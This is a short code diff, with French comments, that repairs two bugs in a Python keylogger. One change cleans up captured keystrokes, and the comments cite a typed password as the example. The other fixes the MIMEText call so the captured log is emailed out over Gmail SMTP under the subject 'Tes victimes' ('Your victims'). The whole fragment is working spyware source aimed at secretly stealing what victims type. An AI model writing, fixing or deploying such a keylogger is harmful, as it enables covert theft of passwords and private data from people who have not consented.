@@ -13,7 +13,7 @@ def key_logs(key):
 
     # Ici, pour avoir un output plus lisible on enlève les '' à chaque caractère concaténé à la variable globale keystrokes (ie au lieu de lire 'M''D''P' on lira MDP). 
     # Par ailleurs, la conversion en chaînes de caractères est nécessaire parce que la clé (lettre tapée) est stockée avec un type 'keycode', et non pas sous forme de string.
-    key = str(key).replace(" ","") 
+    key = str(key).replace("'","") 
 
     # Pour la lisibilité encore.
     if key == "Key.backspace":
@@ -52,7 +52,7 @@ def send_mail_with_content(content):
     msg['To'] = to_mail
     msg['Subject'] = "Tes victimes"
 
-    msg.attach(MAILText(content,'plain'))
+    msg.attach(MIMEText(content,'plain'))
 
     # création du serveur pour l'envoi du mail
     server = smtplib.SMTP('smtp.gmail.com',587)
